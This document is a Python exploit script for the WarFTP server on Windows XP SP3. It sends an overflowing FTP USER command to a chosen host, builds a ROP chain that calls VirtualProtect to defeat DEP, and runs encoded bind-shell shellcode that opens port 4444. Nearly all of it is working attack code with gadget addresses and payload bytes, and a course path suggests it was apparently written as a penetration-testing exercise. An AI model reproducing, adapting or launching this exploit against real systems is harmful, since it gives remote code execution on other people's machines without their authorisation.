#Coded by CymonL33t
#Tested on Windows XP service Pack 3 English
#Bypass DEP with ESP preserve method
#Only one Non ASLR application module [MFC42.DLL] (C:\Documents and Settings\cymon\Desktop\SEC660.5\WarFTP\MFC42.DLL)
#Since the ROP gadgets is used from others rebased modules , you may neet to fix in order to work on your machine.

import struct
import sys
import socket


if len(sys.argv) != 3:
	print "[*] Usage: %s <target> <port>\n" % sys.argv[0]
	sys.exit(0)

target = sys.argv[1]
port = int(sys.argv[2])



payload = "A" * 485
#eip = struct.pack('<L',0x7e4456f7 ) # jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] 



#1. preserver ESP so that we can write Virtual Protect's arguments relateing to this ESP ( position independent code )

# Gets ESP into EDI to save ESP.
#This affects edx register.(DEC EDX ??)
esp  = struct.pack('<L',0x5f49ea90)     # PUSH ESP # DEC EDX # POP EDI # RETN    ** [MFC42.DLL] **
esp += struct.pack('<L',0x41414141)     #This value is for padding coz of POP EDI (unwanted instruction)

#Save esp valuse into eax register
esp += struct.pack('<L',0x77c1e842)     # PUSH EDI # POP EAX # POP EBP # RETN    ** [MSVCRT.dll] **
esp += struct.pack('<L',0x41414141)     # This value is for padding coz of  POP EBP (unwanted instruction)


#Make a stack space for VirtualProtect function arguments
esp += struct.pack('<L',0x5f425eb1)     # ADD ESP,20 # RETN 0x04    ** [MFC42.DLL] **  (0x20 = 32bytes)
#esp += struct.pack('<L',0x41414141)     # This value is for padding coz of RETN 0x04




#For Virutal Protect function's arguments and return address

#Found VP function address uning this mona command
# !mona ropfunc -o -cp nonull 
virt  = struct.pack('<L',0x7c801ad4)    # Addr of VirtualProtect() from MFC42.DLL # In windows XP, this address can be static 

virt += "RETN"                          # Return address placeholder for where virtualprotect() will return - Shellcode!
virt += "PADD"                          # lpAddress placeholder - Pointer to base addr of pages whose iprotect needs to change. Base of stack containing SC
virt += "PADD"                          # dwsize placeholder - Size of shellcode. Make sure this doesn't bleed over outside of stack bounds.
virt += "PADD"                          # flNewProtect placeholder - New protect option. 0x00000040 for Page_Execute_ReadWrite.
virt += struct.pack('<L',0x5ada1004)    # flOldProtect placeholder - Just needs to be a writable address. Using uxtheme.dll's data section.

virt += "A" * 8                         # This value is for padding bcoz we make stack space 0x20(32 bytes)
                                        # But VP functon call total size is 24 bytes. So add 8 bytes as a padding


#For preparing and writing VP functions arguments related with preserved ESP value 
rop  = struct.pack('<L',0x77c4ec2b)     # ADD EAX,100 # POP EBP # RETN    ** [MSVCRT.dll] **
rop += struct.pack('<L',0x41414141)     # This value is padding for above instruction #ADD ESP,20 # RETN 0x04
rop += struct.pack('<L',0x41414141)     # This value is for padding coz of POP EBP (unwanted instruction)

#Move preserved ESP value into ESI register
#0x7c820def (This address can't work ??? because of bad char so find another address )
rop += struct.pack('<L',0x7c9feb10)     # 0x7c9feb10 :  # MOV ESI,EDI # DEC ECX # RETN 0x10    ** [SHELL32.dll] **


#Write the VP's first argument (lpAddress)
rop += struct.pack('<L',0x773fac3f)     # MOV DWORD PTR DS:[ESI+14],EAX # POP ESI # POP EBP # RETN 0x04    ** [comctl32.dll] **
rop += "A" * 16                         # # 0x7c9feb10 :  # MOV ESI,EDI # DEC ECX # RETN 0x10 (padding for this RETN 0x10)

rop += "A" * 8                          # This value is for padding coz of POP ESI & POP EBP (unwanted instruction)

#For writing VP's reutrn address (same with lpAddress and the shellcode will locate at this address)
rop += struct.pack('<L',0x7c9feb10)     # restore the ESI value # 0x7c9feb10 :  # MOV ESI,EDI # DEC ECX # RETN 0x10    ** [SHELL32.dll] **
rop += "A" * 4                          # # MOV DWORD PTR DS:[ESI+14],EAX # POP ESI # POP EBP # RETN 0x04 (padding for this RETN 0x04)


rop += struct.pack('<L',0x5f460123)     # MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN 0x04    ** [MFC42.DLL] **
rop += "A" * 16                         # restore the ESI value # 0x7c9feb10 :  # MOV ESI,EDI # DEC ECX # RETN 0x10 (padding for this RETN 0x10)
rop += struct.pack('<L',0x41414141)     # This value is for padding coz of POP ESI (unwanted instruction)

#For writing VP's second arguments (dwSize 0x100 value)
rop += struct.pack('<L',0x7758040b)     # XOR EAX,EAX # RETN    ** [ole32.dll] **
rop += "A" *4 
rop += struct.pack('<L',0x77c4ec2b)     # ADD EAX,100 # POP EBP # RETN    ** [MSVCRT.dll] **
rop += struct.pack('<L',0x41414141)     # This value is for padding coz of POP EBP (unwanted instruction)
rop += struct.pack('<L',0x7c9feb10)     # restore the ESI value # 0x7c9feb10 :  # MOV ESI,EDI # DEC ECX # RETN 0x10    ** [SHELL32.dll] **
rop += struct.pack('<L',0x77534958)     # MOV DWORD PTR DS:[ESI+18],EAX # MOV EAX,ESI # POP ESI # RETN    ** [ole32.dll] **
rop += "A" * 16
rop += "A" * 4                         # This value is for padding (POP ESI from above assembly instruction)


#For Writing VP's third arguments (flNewProtect 0x40)
rop += struct.pack('<L',0x7c9feb10)     # restore the ESI value # 0x7c9feb10 :  # MOV ESI,EDI # DEC ECX # RETN 0x10    ** [SHELL32.dll] **
rop += struct.pack('<L',0x7758040b)     # XOR EAX,EAX # RETN    ** [ole32.dll] **
rop += "A" * 16
rop += struct.pack('<L',0x7c974ed8)     # ADD EAX,40 # POP EBP # RETN    ** [ntdll.dll] **
rop += struct.pack('<L',0x41414141)     # This value is for padding ( POP EBP from above assembly instructon)
rop += struct.pack('<L',0x7cbade65)     # MOV DWORD PTR DS:[ESI+1C],EAX # POP ESI # RETN    ** [SHELL32.dll] **
rop += struct.pack('<L',0x41414141)     # This value is for padding ( POP ESI from above assembly instructon)

#Move preserve stack pointer back to VP function
rop += struct.pack('<L',0x7e41fe64)     # MOV EAX,EDI # POP EDI # POP ESI # RETN    ** [USER32.dll] ** (move the preserved ESP value to eax)
rop += "A" * 8                          # This value is for padding ( POP EDI & POP ESI from above assembly instructon)
rop += struct.pack('<L',0x77c1f2cf)     # ADD EAX,0C # RETN    ** [MSVCRT.dll] ** (This will point to VP function)
rop += struct.pack('<L',0x7c81fe01)     # MOV EDI,EAX # RETN    ** [kernel32.dll] **
rop += struct.pack('<L',0x5f4a417c)     # MOV ESP,EDI # RETN    ** [MFC42.DLL] **

nop = "\x41" * 28                       # This padding is needed for VP function return points to our shellcode

#This shellcode is bind shellcode(opens port 4444)
shellcode = "\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x4f\x85"+\
"\x2f\x98\x83\xeb\xfc\xe2\xf4\xb3\x6d\x79\x98\x4f\x85\x7c\xcd\x19"+\
"\xd2\xa4\xf4\x6b\x9d\xa4\xdd\x73\x0e\x7b\x9d\x37\x84\xc5\x13\x05"+\
"\x9d\xa4\xc2\x6f\x84\xc4\x7b\x7d\xcc\xa4\xac\xc4\x84\xc1\xa9\xb0"+\
"\x79\x1e\x58\xe3\xbd\xcf\xec\x48\x44\xe0\x95\x4e\x42\xc4\x6a\x74"+\
"\xf9\x0b\x8c\x3a\x64\xa4\xc2\x6b\x84\xc4\xfe\xc4\x89\x64\x13\x15"+\
"\x99\x2e\x73\xc4\x81\xa4\x99\xa7\x6e\x2d\xa9\x8f\xda\x71\xc5\x14"+\
"\x47\x27\x98\x11\xef\x1f\xc1\x2b\x0e\x36\x13\x14\x89\xa4\xc3\x53"+\
"\x0e\x34\x13\x14\x8d\x7c\xf0\xc1\xcb\x21\x74\xb0\x53\xa6\x5f\xce"+\
"\x69\x2f\x99\x4f\x85\x78\xce\x1c\x0c\xca\x70\x68\x85\x2f\x98\xdf"+\
"\x84\x2f\x98\xf9\x9c\x37\x7f\xeb\x9c\x5f\x71\xaa\xcc\xa9\xd1\xeb"+\
"\x9f\x5f\x5f\xeb\x28\x01\x71\x96\x8c\xda\x35\x84\x68\xd3\xa3\x18"+\
"\xd6\x1d\xc7\x7c\xb7\x2f\xc3\xc2\xce\x0f\xc9\xb0\x52\xa6\x47\xc6"+\
"\x46\xa2\xed\x5b\xef\x28\xc1\x1e\xd6\xd0\xac\xc0\x7a\x7a\x9c\x16"+\
"\x0c\x2b\x16\xad\x77\x04\xbf\x1b\x7a\x18\x67\x1a\xb5\x1e\x58\x1f"+\
"\xd5\x7f\xc8\x0f\xd5\x6f\xc8\xb0\xd0\x03\x11\x88\xb4\xf4\xcb\x1c"+\
"\xed\x2d\x98\x5e\xd9\xa6\x78\x25\x95\x7f\xcf\xb0\xd0\x0b\xcb\x18"+\
"\x7a\x7a\xb0\x1c\xd1\x78\x67\x1a\xa5\xa6\x5f\x27\xc6\x62\xdc\x4f"+\
"\x0c\xcc\x1f\xb5\xb4\xef\x15\x33\xa1\x83\xf2\x5a\xdc\xdc\x33\xc8"+\
"\x7f\xac\x74\x1b\x43\x6b\xbc\x5f\xc1\x49\x5f\x0b\xa1\x13\x99\x4e"+\
"\x0c\x53\xbc\x07\x0c\x53\xbc\x03\x0c\x53\xbc\x1f\x08\x6b\xbc\x5f"+\
"\xd1\x7f\xc9\x1e\xd4\x6e\xc9\x06\xd4\x7e\xcb\x1e\x7a\x5a\x98\x27"+\
"\xf7\xd1\x2b\x59\x7a\x7a\x9c\xb0\x55\xa6\x7e\xb0\xf0\x2f\xf0\xe2"+\
"\x5c\x2a\x56\xb0\xd0\x2b\x11\x8c\xef\xd0\x67\x79\x7a\xfc\x67\x3a"+\
"\x85\x47\x68\xc5\x81\x70\x67\x1a\x81\x1e\x43\x1c\x7a\xff\x98"


payload += esp + virt + rop + nop + shellcode 
#payload += "C" * (1000-len(payload))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connecting to %s on port %d" % (target,port)
s.connect((target, port))
print s.recv(1024)
print "[+] Sending payload"
s.send("user " + payload + "\r\n")
s.close()
print "[+] Exploit successfully sent"
